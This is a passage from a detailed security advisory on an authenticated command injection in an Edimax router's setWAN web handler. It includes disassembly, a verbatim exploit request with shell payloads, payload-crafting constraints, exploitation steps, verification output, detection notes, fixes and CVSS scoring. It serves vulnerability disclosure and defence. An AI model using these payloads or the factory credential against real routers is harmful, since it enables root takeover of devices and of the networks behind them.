`websGetVar` is reached through the function-pointer table entry at `0x4c6b18`,
resolving to `0x412a7c`. Its behaviour, from the disassembly: decode the URL-encoded
value of the named field from the request's form-variable table and return a pointer to
it; strip a trailing carriage return and/or line feed; return the supplied default (an
empty string here) if the field is absent. It performs no character filtering and no
length clamping beyond what the parser already applied. Every handler in the binary uses
this same accessor, which is why a per-field validation step cannot be assumed to exist
anywhere in the product.

### Source Identification — the semicolon scan in detail

Read as instructions rather than as a decompiler summary, the scan is:

```
0x441ebc  addiu a0, zero, 0x3b      /* a0 = ';' */
          ...
          lb    a1, (a1)            /* load one byte of the buffer   */
          bne   a1, a0, <continue>  /* if byte != ';' keep walking   */
          sb    zero, (a1)          /* on match: write NUL, stop     */
          ...
0x441ee4  <end of loop>
```

Its complete behaviour is "truncate at the first semicolon". Consequently:

- `;` is neutralised: a payload of `;id;#` is cut to an empty prefix, which is why the
  published payload uses a different separator.
- `|` (`0x7c`) is not touched, so it opens a pipeline whose right-hand side is
  attacker-chosen.
- `&` (`0x26`) is not touched, so it can background a command or chain two.
- `#` (`0x23`) is not touched by the scan - the escaping pass exists but runs after the
  sink and against a different buffer - so it comments out the rest of the line,
  including the sink's own redirect.
- `$` (`0x24`) followed by `(` is not touched, so command substitution works, and a
  backtick (`0x60`) is not touched either.
- An embedded newline (`0x0a`) is not touched (`websGetVar` strips only a *trailing*
  one), and a newline is a command separator in shell grammar, so a multi-line payload
  is possible.

### Source Identification — what a truncating sanitiser does to legitimate use

A filter that truncates rather than rejects has a property worth naming for the vendor:
it fails silently, in both directions. On the security side it removes one
metacharacter and leaves roughly a dozen. On the correctness side it stores a shortened
credential and gives the owner no diagnostic, so an ISP username that legitimately
contains a semicolon becomes a WAN link that will not come up. A validator that rejects
with an error would have been both safer and more useful, and costs no more code than
the loop that is there.

### Source Identification — validation that is absent

- No maximum or minimum length check on a field that is `strcpy`'d into a fixed stack
  buffer.
- No character-set allowlist for a field whose legitimate content is a printable
  username token.
- No control-character rejection, although an embedded newline is a shell command
  separator.
- No numeric or pattern validation of any kind (no `inet_aton` on this branch, no
  `isdigit`, no regular expression).
- No quoting in the format string: `echo %s > /tmp/UserName` places the value in an
  ordinary word position with no enclosing quote to escape from and no escaping applied.
- No switch to an argv-style execution primitive (`execve`, `posix_spawn`), and no
  decision to avoid the shell at all even though the operation is "write one string to
  one file".
- No request-level hardening: no referer validation, no same-site token observed, no
  per-handler rate limit.

## 7. Data Flow

### Data Flow — end to end

```
attacker (LAN / Wi-Fi, holds one valid Basic credential)
  |  POST /goform/setWAN
  |  Content-Type: application/x-www-form-urlencoded
  |  Authorization: Basic <credential>
  |  body: wanMode=2&pppUserName=|id>/tmp/marker #&submit-url=/wan.asp
  v
bin/webs  (TCP 80, process identity root, boa.conf "User root")
  request parser: URL-decodes the body into the form-variable table
  v
process_header_end            @ 0x40c4d4
  v
auth_authorize                @ 0x404d00
  apmib_get(0x1bc) -> setup-wizard flag; flag set -> security store @ 0x4c7004
  single entry: prefix "/", type "Basic", file /etc/boa/boa.passwd
  -> 401 challenge unless the credential validates
  v
handleForm                    @ 0x412440   (looks up "setWAN")
  v
setWAN                        @ 0x441cec
  wanMode read + atoi + apmib_set(0x102)     @ 0x441d3c / 0x441d44 / 0x441d54
  beq -> PPP branch                          @ 0x441d6c -> 0x441e74
  websGetVar("pppUserName")                  @ 0x441e74  (name 0x4953f4)
  strcpy into fixed stack buffer             @ 0x441e94
  inline scan for ';' only                   0x441ebc..0x441ee4  (no ';' in payload)
  v
sprintf(buf2, "echo %s > /tmp/UserName", buf) @ 0x441ee8  (fmt 0x49a510)
  buf2 = "echo |id>/tmp/marker # > /tmp/UserName"
  v
system(buf2)                  @ 0x441f1c   PLT slot 0x4c6d60
  v
/bin/sh -c "echo |id>/tmp/marker # > /tmp/UserName"
  '#' comments out " > /tmp/UserName"; pipeline is: echo | id>/tmp/marker
  id runs as root and writes the marker
  v
marker file: 39 bytes, owner root:root, "uid=0(root) gid=0(root) groups=0(root)"
sink's own destination /tmp/UserName: NOT created (the comment swallowed it)
  v
afterwards: '#'->'\#' escape loop 0x441f4c..0x441fb0 on the CONFIG buffer
            apmib_set(0x6d, ...)             @ 0x44200c
```

### Data Flow — the request, verbatim

```
POST /goform/setWAN HTTP/1.1
Host: <target>
Authorization: Basic YWRtaW46MTIzNA==
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>
Connection: close

wanMode=2&pppUserName=|id>/tmp/marker%20%23&submit-url=/wan.asp
```

The `#` is percent-encoded as `%23` and the space as `%20` so that the request parser
hands the handler the literal string `|id>/tmp/marker #`. The credential line uses the
factory password so the request is self-documenting; the injection does not depend on
it, and the PoC in this directory takes `--username` and `--password` so that a tester
uses a credential they are authorised to use. Substituting `wanMode=3` with
`pptpUserName`, or `wanMode=6` with `L2TPUserName`, reaches the same construction.

### Data Flow — shell grammar that makes the payload work

- **Pipeline `|`**: the sink line becomes `echo <payload> | <command>` plus whatever
  follows. `echo` runs and produces nothing useful; the second stage is the attacker's
  command, and a pipeline stage is an ordinary shell process running with the parent's
  identity - root.
- **Comment `#`**: everything after the first unquoted `#` on the line is discarded,
  including the sink's own ` > /tmp/UserName`. This is what keeps the command
  syntactically clean without needing to balance the format string's tail. It requires
  a space before the `#` so the shell sees a comment start rather than part of a word.
- **Command substitution `$(...)` and backticks**: evaluated during expansion. They are
  not filtered either, and give a payload that does not need to disturb the redirect at
  all - useful when the tester wants `/tmp/UserName` still written, so the submission
  looks entirely normal afterwards.
- **Background and chaining `&`**: not filtered; `&` can detach a command, which is the
  natural shape for a longer-running agent.
- **Newline**: not filtered by the scan (`websGetVar` strips only a trailing one) and a
  newline separates commands in shell grammar, so a multi-line payload can carry a whole
  script body in one field.

The practical consequence for a reviewer: any deny-list over this field has to enumerate
the shell grammar, which is larger than the one character this code checks. The
semicolon scan is not a weak filter - it is one character of a grammar with roughly a
dozen ways to start a command.

### Data Flow — why the semicolon truncation is not a defence, and what it does do

It is worth being precise about what the scan achieves, because a vendor may read it as
a partial fix that only needs extending. It achieves three things: it stops the most
obvious payload (`; command ;`); it silently corrupts any legitimate username containing
a semicolon; and it gives false confidence to anyone reading the source who assumes
"they thought about shell metacharacters here". It does not stop `|`, `&`, `$(`,
backtick, `#` or newline, and extending it character by character is the wrong
direction: the field is interpolated unquoted into a shell command line, so the only
durable fixes are to remove the shell, to pass the value out of band (environment or
argv), or to enforce a positive allowlist of characters that a username may contain.

### Data Flow — properties of the chain worth naming

- Single request, single response, no multi-stage state. The only branch the attacker
  must satisfy is `wanMode`, which the request supplies.
- The sink is on the normal path: every successful PPP configuration submission runs
  this `system()` call, so the attacker is not steering the product into an error path.
- Output is blind. Shell stdout does not reach the HTTP response, so results must be
  read back through a file, a second request, a serial console or an out-of-band
  channel.
- The injection leaves a distinctive negative trace: the sink's own `/tmp/UserName` is
  *not* created when the payload ends in a comment, while a legitimate submission
  creates it.
- A successful submission also stores the payload as the device's PPP username, which
  changes WAN behaviour and can take the uplink down: the exploit is not side-effect
  free, and section 10 treats that as both an availability impact and an indicator.
- Files under `/tmp` are on tmpfs and do not survive reboot, so markers are volatile
  while the configuration write is persistent.

## 8. Exploit Construction

### Exploit Construction — step sequence

1. **Confirm the credential.** Any authenticated request will do: a `401` with
   `WWW-Authenticate: Basic realm=...` confirms the realm exists, and a `302`/`200` on
   a management page confirms the credential is accepted.
2. **Confirm the route and the current WAN mode.** Read the WAN settings page (or
   submit `wanMode` unchanged) so the test does not gratuitously break the owner's
   uplink. Record the existing PPP username first - the handler overwrites it.
3. **Choose the payload shape.** Default: `pppUserName=|id > /tmp/marker #`, which
   pipelines the injected command and comments out the sink's redirect. If the tester
   wants the submission to look completely normal afterwards, use
   `$(id > /tmp/marker)` instead, which leaves `/tmp/UserName` written.
4. **Build the body.** `wanMode=2` with `pppUserName`, or `wanMode=3` with
   `pptpUserName`, or `wanMode=6` with `L2TPUserName`, plus
   `submit-url=/wan.asp`. Include no semicolon - the scan truncates at one.
5. **Send the request** with the Basic credential and a short timeout (the PoC uses 8
   seconds). The server may close the connection without a useful body; that is expected.
6. **Read the result back.** The marker is volatile but readable from any channel the
   tester holds: a second injection that copies it somewhere served statically, a serial
   console, or SSH with the same credential. The PoC does not implement retrieval and
   says so.
7. **Restore state.** Re-submit the original WAN configuration, including the original
   username, because the injection overwrote it, and verify the uplink comes back.

### Exploit Construction — payload engineering constraints

- No semicolon may appear anywhere in the payload: the scan truncates at the first one,
  and the truncation is silent.
- A space before `#` is required for the shell to read it as a comment start; without
  the space the character joins the preceding word.
- The payload must survive URL encoding, so `|`, `>`, `#`, spaces and `$` are
  percent-encoded (`%7C`, `%3E`, `%23`, `%20`, `%24`); `websGetVar` returns the decoded
  bytes.
- Length should stay modest. The value is copied by an unbounded `strcpy` into a fixed
  stack buffer; a long payload risks a crash rather than an execution, and a crash is a
  worse outcome for a tester than a short, working payload. We did not measure the
  buffer capacity, so the PoC keeps payloads short and the tester should too.
- Command output must be redirected explicitly if it is wanted: shell stdout goes to the
  server process, not to the HTTP response, so `> /tmp/marker 2>&1` inside the payload is
  what makes the result readable.
- Quoting is unnecessary and can break the parse: the format string places the value in
  an ordinary word position with no enclosing quote, so an unbalanced quote in the
  payload can consume the rest of the line.

### Exploit Construction — reading the result back

This is a blind injection unless the tester picks a channel. In order of convenience:
write the marker under `/tmp` and retrieve it with a second injection that copies it
under the web root or into a statically served path; exfiltrate from the device over an
outbound connection, which the WAN input policy does not block; or use physical access
via serial console or SSH. The PoC in `exploit/` implements none of these and reports
that reading the marker back is the tester's responsibility.

### Exploit Construction — what the exploit deliberately does not do

- It does not install persistence, does not modify the boot path, and does not write to
  the flash configuration area beyond what the handler itself stores.
- It does not open a callback listener, does not attempt a reverse shell, and does not
  download anything.
- Its default command is `id`, which writes a marker; nothing destructive runs unless
  the tester passes `--cmd`.
- It refuses to contact a non-loopback target unless `--allow-remote` is given, and
  prints the raw request without sending under `--print-request`.
- It performs all local replication inside a per-run temporary directory and removes
  that directory before exiting, so it never writes `/tmp/UserName` on the tester's own
  machine.
- It does not attempt the overflow suggested by the unbounded `strcpy`. That surface is
  reported to the vendor as an observation and is not part of this exploit.
- It does not attempt the setup-state branch of the authentication gate, which would
  need no credential; using it would change what this advisory claims.

## 9. Dynamic Verification

### Dynamic Verification — environment

What we verified is sink semantics, and the reason matters. The firmware targets a MIPS
32-bit big-endian board with uClibc and a board-specific bootloader; our environment
could not boot that userspace end to end, an attempt to run the extracted binaries under
the available user-mode translator faulted with SIGBUS, and full-system emulation of the
board was not brought up. Rather than publish a static-only claim, we replicated the
operation the vulnerability consists of. The licensing argument is narrow: what is under
test is not the device but the question "when `system()` passes
`echo |id > /tmp/marker # > /tmp/UserName` to `/bin/sh -c`, does the shell run the
pipeline and discard the redirect as a comment?" That is answered by POSIX shell grammar,
which is architecture-independent, using the exact format string and value read out of
the shipped binary. Everything else in the chain - request parsing, the authentication
gate, form registration, mode dispatch and branch selection - is evidenced from firmware
artefacts at instruction level, as sections 5 and 6 record.

Two runs were performed. The first in an isolated cloud sandbox where the invoking shell
ran as root, testing the identity claim. The second on a workstation under an ordinary
unprivileged user account, testing that the semantics do not depend on the invoking
identity. Neither involved the product.

### Dynamic Verification — what was run

The command string handed to `/bin/sh -c` is byte-for-byte what `sprintf` produces at
`0x441ee8` when `pppUserName` is `|id>/tmp/marker_setwan #`:

```
rm -f /tmp/marker_setwan /tmp/UserName
/bin/sh -c 'echo |id>/tmp/marker_setwan # > /tmp/UserName'
echo EXIT=$?
cat /tmp/marker_setwan
ls -la /tmp/marker_setwan
ls -la /tmp/UserName
```

The control run substitutes a benign username, `validuser`, into the same format string
but with a second, distinct destination so that the injected run's evidence cannot be
confused with it:

```
rm -f /tmp/UserName2
/bin/sh -c 'echo validuser > /tmp/UserName2'
echo EXIT=$?
cat /tmp/UserName2
ls -la /tmp/marker_setwan
```

The PoC in this directory performs the same two runs on demand inside a per-run
temporary directory.

### Dynamic Verification — observed output

```
=== setWAN injected run: pppUserName=|id>/tmp/marker #  ===
EXIT=0
--- marker (expected uid=0) ---
uid=0(root) gid=0(root) groups=0(root)

-rw-r--r-- 1 root root 39 <redacted timestamp> /tmp/marker_setwan
--- UserName (must NOT exist: '#' commented the redirect out) ---
(none)
=== benign control (pppUserName=validuser, no metacharacter) ===
EXIT=0
--- control marker (must NOT exist) ---
(none)
--- control destination (must exist with the username in it) ---
validuser

root
uid=0(root) gid=0(root) groups=0(root)
```

- The marker was created and contains `uid=0(root) gid=0(root) groups=0(root)` - 39
  bytes, owner `root:root` - so the pipeline's second stage ran with the invoking
  identity, which on the device is root by the `User root` directive.
- `/tmp/UserName` was *not* created, which is the load-bearing observation: the sink's
  own redirect disappeared, and the only construction that removes it is the shell
  reading the trailing `#` as a comment. That is precisely the claim about the escape
  loop at `0x441f4c` - it runs after `system()` and against a different buffer, so it
  cannot have interfered.
- Exit status was 0 rather than 127, unlike the companion `formWlanMP` case, because
  every command word in this line exists.
- The benign control produced no marker and did produce its destination file containing
  `validuser`, so the harness is not manufacturing markers and the pipeline only runs
  when the payload asks for one.
- The workstation run under an ordinary user reproduced the same semantics at that
  account's identity, excluding the alternative explanation that the marker was an
  artefact of running as root.

### Dynamic Verification — the negative control and why it matters

Three controls protect the claim. A benign username produces no marker, so marker
creation follows the payload and not the harness. The benign username *does* produce its
destination file, so the absence of `/tmp/UserName` in the injected run is a real
difference and not a general failure of the redirect. And the PoC removes any pre-existing
marker and destination before each run and deletes its scratch directory afterwards, so no
file survives from an earlier invocation to be mistaken for evidence. The two independent
environments - one root, one ordinary user - produced markers with different ownership,
which is what a genuinely executed `id` does.

### Dynamic Verification — what was not run, stated plainly

- **No physical device was powered on.** We never booted `BR6478AC_v2.20.bin` and never
  sent an HTTP request to an Edimax product.
- **No end-to-end HTTP detonation.** The request path, the gate, the dispatch and the
  branch selection are evidenced from the shipped binary and configuration, not from
  observed HTTP exchange.
- **The `wanMode` 3 and `wanMode` 6 paths were not dynamically exercised.** They were
  read out of the same handler; only the `wanMode` 2 path was replicated. Their status is
  structural, and section 5 says so.
- **The sibling model was not tested at all.** The BR-6208AC comparison is a static
  reading of a second image; nothing was executed against it and no claim is made about
  its exploitability in practice.
- **The unbounded `strcpy` was not exercised.** No overflow was developed, no buffer
  capacity was measured, and no exploitability claim is made.
- **No setup-state request was sent.** The flag-`0` branch of `auth_authorize` is a
  reading of the code, never an observation.
- **No credential attack was attempted**, and no rate-limit measurement was taken beyond
  reading the configuration.

### Dynamic Verification — independent review of the static chain

The chain was reviewed twice by independent passes before publication: one re-deriving the
sink from the binary without reference to the original analysis, and one attempting to
refute it. The refutation attempt attacked seven specific propositions and failed on all
seven:

1. that some validation function exists between `websGetVar` and `system` that the
   original analysis missed - no call target in that range resolves to a validator;
2. that the `#` escape pass at `0x441f4c` protects the sink - it does not, on instruction
   order and on buffer identity;
3. that the security store contains a `None` entry covering `/goform/setWAN` - it does
   not; the only entry is `/` with type `Basic`;
4. that the shell semantics relied upon do not hold - they were then tested, and they do;
5. that the handler is not actually registered - it is, at `0x478484`;
6. that `wanMode=2` does not reach the PPP branch - it does, via `0x441d6c`;
7. that the `strcpy` into the stack buffer breaks the payload before the sink - it does
   not for a short payload, which is what the published payload is.

Both passes concluded that the sink is real and that the route requires authentication in
the normal-operation state. The same two-pass mechanism is what corrected the
authentication classification of this product's findings from unauthenticated to
authenticated, lowering the published score; the corrected reading is what section 12
carries.

### Dynamic Verification — boundaries of what was verified

| Claim | Evidence class | Status |
|---|---|---|
| `wanMode` selection and the PPP branch at `0x441e74` | firmware artefact, instruction level | established |
| only `;` is scanned before the sink | firmware artefact, raw instructions `0x441ebc`-`0x441ee4`, two review passes | established |
| `sprintf` builds `echo <value> > /tmp/UserName`, format at `0x49a510` | firmware artefact | established |
| `system()` at `0x441f1c` executes it | firmware artefact | established |
| the `#` escape runs after the sink and on the config buffer | firmware artefact, instruction order | established |
| the route requires Basic authentication in normal operation | firmware artefact (`auth_authorize`, security store, `boa.conf`) | established |
| the route is not uptime-gated | firmware artefact (no `/proc/uptime` read in the handler) | established |
| the pipeline executes and the redirect is commented out | dynamic replication, root and non-root | demonstrated |
| the injected command runs as root on the device | `User root` in `etc/boa/boa.conf` plus root-identity replication | inferred, strongly |
| a physical device accepts the request end to end | none | not demonstrated |
| `pptpUserName` and `L2TPUserName` are injectable the same way | firmware artefact, single reading of the same handler | structural inference |
| the sibling model carries the same defect | static comparison of a second image | structural inference, untested |
| the unbounded `strcpy` is exploitable | none | not tested, not claimed |

## 10. Reachability and Security Impact

### Reachability and impact — network position

The management interface listens on TCP port 80 on the device's own addresses. The
shipped firewall script installs `iptables -P INPUT DROP` (`firewall.sh:187`), drops
WAN-originated `SYN` packets (`firewall.sh:180`) and accepts input arriving on any other
interface (`firewall.sh:189`), so on a stock device the attacker's position is a host on
the wired LAN or an associated wireless client. In a SOHO deployment that position is not
benign: it includes guest-network clients, any compromised device behind the router,
anything bridged onto the segment, and any host that reaches the LAN over a VPN or through
an existing misconfiguration. Two ordinary operator actions move it to the open internet -
enabling remote management, or forwarding port 80 - and both are documented product
features. Because WAN configuration is a routine owner action, this route stays reachable
for the whole life of the device, unlike the factory routes that close after a boot
window.

### Reachability and impact — what root on this device controls

A root shell on a SOHO router is the trust domain of everything behind it. From the
configuration store and filesystem, the identity reached here can read the administrator
password file; read every wireless pre-shared key and per-station key material; read the
PPP, PPTP and L2TP credentials that this very handler writes into configuration objects
`0x6d`, `0xf3` and `0x128` - that is, the ISP or VPN account the owner entered; read VPN
settings and any certificate on the device; rewrite firewall and NAT rules to expose or
hide hosts; change the DNS resolver handed out by DHCP, which converts one compromised
router into a credential-harvesting and content-injection point for every client behind
it; hand out a malicious default gateway; disable or redirect the WAN uplink; and modify
flash-backed configuration so the changes survive reboot and, where a boot path was
written, survive a configuration reset.

### Reachability and impact — the privilege question, answered in full

There is no privilege boundary in this chain, which is why the impact metrics are all
High without an escalation step appearing anywhere in the analysis. `webs` starts during
early init and remains root because the shipped `etc/boa/boa.conf` declares `User root`;
it writes `/var/run/webs.pid`; no `setuid`, `chroot`, namespace or capability drop appears
in its startup path. The shell that `system()` spawns at `0x441f1c` inherits uid 0, and
our replication of that shell under root produced a marker owned by `root:root` containing
`uid=0(root) gid=0(root) groups=0(root)`. We state the on-device identity as
`uid=0(root)` on the strength of the shipped directive plus the replication; we did not
observe it on hardware, and we make no claim about the runtime identity of any other
Edimax model, including the sibling image compared in section 5.

### Reachability and impact — detection notes

- The request is indistinguishable from an owner's own WAN settings submission. It posts
  to the same route, with the same fields, including `submit-url=/wan.asp`. The anomaly
  is not the route but the content of a username field: a pipe, a dollar sign with
  parentheses, a backtick, an ampersand, a hash or an embedded newline in a value that is
  documented as a username.
- The strongest single indicator is a missing artefact. A legitimate submission creates
  `/tmp/UserName`; a payload that ends in a comment prevents the sink from creating it. A
  submission that stored a PPP username while `/tmp/UserName` did not appear is precisely
  this exploit.
- A stored username containing `|`, `#` or `$()` in the device's WAN configuration is
  evidence in itself, and it is persistent, unlike the marker.
- An uplink that stops authenticating after a configuration change, with a PPP username
  that looks wrong in the management interface, is the availability-side signature of the
  same event.
- Shell diagnostics are weaker here than in the companion `formWlanMP` case: every command
  in this sink line exists, so the shell exits 0 and prints nothing. There is no
  command-not-found line to alert on, which is one reason the negative indicator above
  matters.
- Post-exploitation indicators are the ordinary ones: new outbound connections from the
  router, a changed DNS resolver in DHCP leases, new port forwards, or a modified init
  script.

### Reachability and impact — the configuration side effect, treated honestly

This exploit is not quiet in one respect, and the advisory should say so plainly: a
successful submission overwrites the stored WAN username, because that is what the handler
does with any value it is given. Depending on the payload and the uplink type, the WAN
link may then fail authentication - so an attack can announce itself as an outage, and a
tester working against a production device will break connectivity unless they restore the
original value. This is why the PoC instructs the tester to record and restore the
configuration, and why the availability metric is High without needing any additional
primitive: root can stop services at will, and even the unrefined injection has an
availability cost. It is also why the silent truncation defect noted in section 5 matters
to the vendor: an owner whose username legitimately contains a semicolon gets a broken
uplink with no diagnostic, which is the same failure mode an attacker produces
deliberately.

### Reachability and impact — repeatability and persistence

The route can be driven as often as an attacker likes: there is no per-handler rate limit,
no lockout in the Basic realm that we found, and no state consumed by a successful
submission beyond the configuration write itself. From root, several independent
persistence choices are available - a modified init script, a changed boot-time
configuration value, a replacement helper script, a startup entry - none of which requires
touching the web interface again. Recovery for an owner who suspects compromise is a full
reflash from a trusted image plus re-entry of all credentials, because root access exposes
all of them and a configuration reset does not undo a written boot path.

## 11. Fix Recommendations

### Fix Recommendations — vendor side, ordered by root cause

1. **Remove the shell from the storage path.** The reason sanitisation matters here is
   that the handler persists a string by running `echo`. Replace
   `sprintf` + `system` at `0x441ee8` / `0x441f1c` with a direct file write
   (`fopen`/`fwrite`) or with the `apmib_set` call the same function already makes at
   `0x44200c`. That single change removes the sink for all three username parameters at
   once.
2. **If a shell call must remain, use argv or the environment.** `execve` with one argv
   element per value, or a child that reads its input from the environment, has no shell
   in the loop and therefore no grammar to defend against. Apply the same treatment across
   the `system()` / `popen()` population in `bin/webs` - our count of the registration
   table is 91 `/goform/form*` handlers, of which roughly 85 reach a command execution
   call - and start with the handlers that interpolate request data rather than stored
   configuration.
3. **Validate the username fields against a positive allowlist.** Enforce a maximum
   length, reject control characters, and accept only
   `^[A-Za-z0-9._@/+-]+$`. Reject with an error rather than truncate: silent truncation
   stores a credential the uplink cannot use.
4. **Bound the copy.** Replace the `strcpy` at `0x441e94` with a length-checked equivalent
   and validate the field length against the destination before copying. No exploitability
   claim is made for the unbounded copy; it is reported so it is fixed in the same pass.
5. **Move or delete the `#` escape at `0x441f4c`.** If escaping is needed for the stored
   value, keep it where it is; do not present it as sanitisation for the command path. If
   the shell goes away per (1), the escape becomes a storage-encoding decision only.
6. **Search the software base for the same idiom.** The format string
   `echo %s > /tmp/UserName` and the immediate-`0x3b` scan appear in a second Edimax
   model's firmware (section 5). Treat this as a shared-component defect and grep the
   vendor's router code base for `echo %s >` interpolations into `system()`.
7. **Separate privileges for the HTTP server.** `etc/boa/boa.conf` declares `User root`.
   Bind the low port as root and drop to a dedicated unprivileged account before serving,
   keeping elevation inside a small audited helper (CWE-250). This converts the next
   injection in this family from device takeover into a contained incident.
8. **Replace the factory credential in the field.** Force a password change on first
   authenticated session or provision a per-unit random password; move off MD5-crypt to a
   memory-hard digest; add rate limiting and lockout on the Basic challenge (CWE-798).
9. **Make management-plane exposure explicit.** Keep WAN-side management access off by
   default as a documented product decision rather than a firewall-script side effect,
   allow management from named source addresses only, and log `/goform/` submissions whose
   username fields contain shell metacharacters.

### Fix Recommendations — a regression test the vendor should add

- Submit `pppUserName=|id > /tmp/x #` to `POST /goform/setWAN` with `wanMode=2` on an
  instrumented build and assert: the request is rejected with a validation error, no marker
  file appears, and no child shell is spawned (assert on the process table or on an
  instrumented `system`/`execve` hook).
- Repeat for `wanMode=3` with `pptpUserName` and `wanMode=6` with `L2TPUserName`, because
  the three paths are separate code and a fix to one does not imply a fix to the others.
- Repeat with the `$(...)`, backtick, `&` and embedded-newline variants of the payload,
  since each exercises a different metacharacter class than the semicolon the current scan
  already handles.
- Submit `pppUserName=validuser` and assert the legitimate path still stores the username
  and still creates `/tmp/UserName`, so the fix cannot be satisfied by disabling WAN
  configuration.
- Submit a username containing a semicolon and assert the request is rejected with an
  explicit error rather than truncated and stored, fixing the silent-corruption defect at
  the same time.
- Assert from an unconfigured image that `/goform/setWAN` is either not dispatched or
  rejected before setup completes, so the setup-state branch cannot be used as an
  unauthenticated path.

### Fix Recommendations — operator side, until firmware exists

1. Change the factory password immediately; assume it is public.
2. Never expose the management interface to a WAN address, a reverse proxy or a port
   forward, and turn remote management off.
3. Keep the router's management address on a dedicated management VLAN or restrict it at
   the upstream firewall to named hosts.
4. Segment guest wireless clients away from the management subnet; they are the most likely
   starting position for an attacker who already holds a credential.
5. Audit the stored WAN configuration for a PPP, PPTP or L2TP username containing `|`, `#`,
   `$(`, a backtick or a newline - that is evidence of exploitation, not of a typo.
6. Treat any device still running 2015-era firmware as end-of-support and plan replacement;
   the vendor's ability to ship fixes for a build this old is limited.
7. If compromise is suspected, reflash from a trusted image and re-enter every credential
   (wireless, PPP/VPN, administration), then verify the uplink authenticates.

## 12. CWE and CVSS

### CWE and CVSS — classification

| Classification | Assignment | Justification |
|---|---|---|
| Primary | **CWE-78** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | a request field is interpolated unquoted into a string passed to `system()`, which hands it to `/bin/sh -c`; the only filter on the path checks one character out of the shell's grammar |
| Reported separately | **CWE-798** Use of Hard-coded Credentials | the image ships a populated `etc/boa/boa.passwd` for its single Basic realm and the model's published factory login is `admin:1234`. Real and serious, but not the vector rated here: the injection and the authentication requirement both exist independently of it |
| Contributing | **CWE-20** Improper Input Validation | a field documented as a username is accepted as free text of unbounded length, which is the enabling defect under CWE-78; the same absence of validation makes the silent semicolon truncation possible |
| Contributing | **CWE-250** Execution with Unnecessary Privileges | the HTTP server parsing untrusted input runs as root (`User root`), so there is no privilege floor beneath any injection in the process |
| Contributing | **CWE-1188** Insecure Default Initialization of Resource | the shared software base ships a shell-based configuration writer with a one-character filter, and default management exposure is a firewall-script side effect rather than a stated decision |
| Observed, not scored | **CWE-121**-class stack copy without bound | the `strcpy` at `0x441e94` writes attacker-controlled bytes into a fixed stack buffer with no length argument. Not tested, not developed, no exploitability claimed; reported so it is fixed in the same pass |

The primary classification and the separately reported one are kept apart deliberately.
Folding CWE-798 into the RCE vector would let a reader believe this is an unauthenticated
root RCE on a correctly configured device, which it is not; omitting it would hide a
weakness that materially changes the risk for any deployment that never rotated its
password. Both are published, and only the injection carries the headline score.

### CWE and CVSS — vector derivation

**Published vector: `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = 7.2 (High).**

| Metric | Value | Weight | Why |
|---|---|---|---|
| Attack Vector | **Network** (`AV:N`) | 0.85 | the vulnerable service is an HTTP listener bound to the device's own network stack on TCP port 80, addressable by any host that can reach the management interface, including across a routed hop. The stock WAN-side `DROP` policy is recorded as a deployment qualifier, with the `AV:A` arithmetic published below |
| Attack Complexity | **Low** (`AC:L`) | 0.77 | one deterministic authenticated request. The only branch to satisfy (`wanMode`) is supplied by the request itself. No race, no window, no memory layout, no gadget |
| Privileges Required | **High** (`PR:H`) | 0.27 | a valid credential for the single Basic realm is required, and that realm's only principal is the device administrator, which holds significant control over the component's configuration |
| User Interaction | **None** (`UI:N`) | 0.85 | the attacker issues the request; no administrator action, click or visit is needed |
| Scope | **Unchanged** (`S:U`) | - | see the Scope decision below |
| Confidentiality | **High** (`C:H`) | 0.56 | root on the device reads the password file, all wireless keys, the stored PPP/PPTP/L2TP credentials and every file on the device |
| Integrity | **High** (`I:H`) | 0.56 | root rewrites WAN, LAN, firewall and NAT configuration, boot scripts and flash-backed state |
| Availability | **High** (`A:H`) | 0.56 | root stops routing, wireless, DHCP, DNS and the management service, or reboots at will; the injection itself can break the uplink by overwriting the stored username |

Arithmetic, CVSS 3.1 base formula with round-up to the tenth:

```
ISS            = 1 - ((1 - 0.56) * (1 - 0.56) * (1 - 0.56))
               = 1 - 0.44^3
               = 1 - 0.085184
               = 0.914816

Impact(S:U)    = 6.42 * ISS
               = 6.42 * 0.914816
               = 5.873119

Exploitability = 8.22 * AV * AC * PR * UI
               = 8.22 * 0.85 * 0.77 * 0.27 * 0.85
               = 1.234708

Base(S:U)      = min(Impact + Exploitability, 10)
               = min(5.873119 + 1.234708, 10)
               = 7.107826
Roundup        = 7.2
```

### CWE and CVSS — the Privileges Required decision

`PR:H` is adopted and `PR:L` is rejected; the rejected vector is
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 8.8 High.

```
Exploitability(PR:L, S:U) = 8.22 * 0.85 * 0.77 * 0.62 * 0.85 = 2.835255
Base                      = min(5.873119 + 2.835255, 10)     = 8.708373
Roundup                                                  = 8.8
```

The evidence, all of it from the shipped image: CVSS 3.1 reserves `PR:L` for a principal
with basic user capabilities that is distinct from the administrator. This product has no
such principal. The realm is populated by one `Auth / /etc/boa/boa.passwd` directive, so
the security store holds exactly one `/` entry of type `Basic`; the `Allow` directive
handler at `0x407688` is a stub that answers "This version of Boa doesn't support access
controls"; the type-`None` string at `0x49070c` is never passed to `auth_add`; the shipped
configuration carries one `Auth` directive and no `Allow` directive, in which our reading
found no per-user or per-group access restriction; and the password file holds one account. Every credential the realm accepts therefore buys full
administrative control - WAN and WLAN rewriting, firmware upgrade, reboot - which is
`PR:H` by definition. Publishing 8.8 would overstate the finding by exactly the 0.6 the
privilege weight carries.

The research notes behind this advisory carried `8.8` beside a `PR:H` vector. That is the
arithmetic of `PR:L` written against the vector of `PR:H`, a recurring error in this
corpus; the score published here was recomputed from the vector, not inherited.

### CWE and CVSS — the Scope decision

**Scope is Unchanged.** The tempting argument for Changed is that the vulnerable component
is the web server while the impact lands on the router's operating system. It fails because
Scope asks whether impact crosses a security-authority boundary, and there is none here:
`webs` is already root before the attack (`etc/boa/boa.conf` declares `User root`, the
process starts from early init, it never drops privileges, and it writes
`/var/run/webs.pid`). The commands run with the same authority, in the same filesystem
view, on the same device as the service that spawned them.

Rejected variant `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` = 9.1 High:

```
Impact(S:C) = 7.52 * (0.914816 - 0.029)
            - 3.25 * (0.914816 * 0.9731 - 0.02)^13
            = 6.661336 - 0.533310
            = 6.128026
Exploitability(PR:H, S:C) = 8.22 * 0.85 * 0.77 * 0.50 * 0.85 = 2.286496
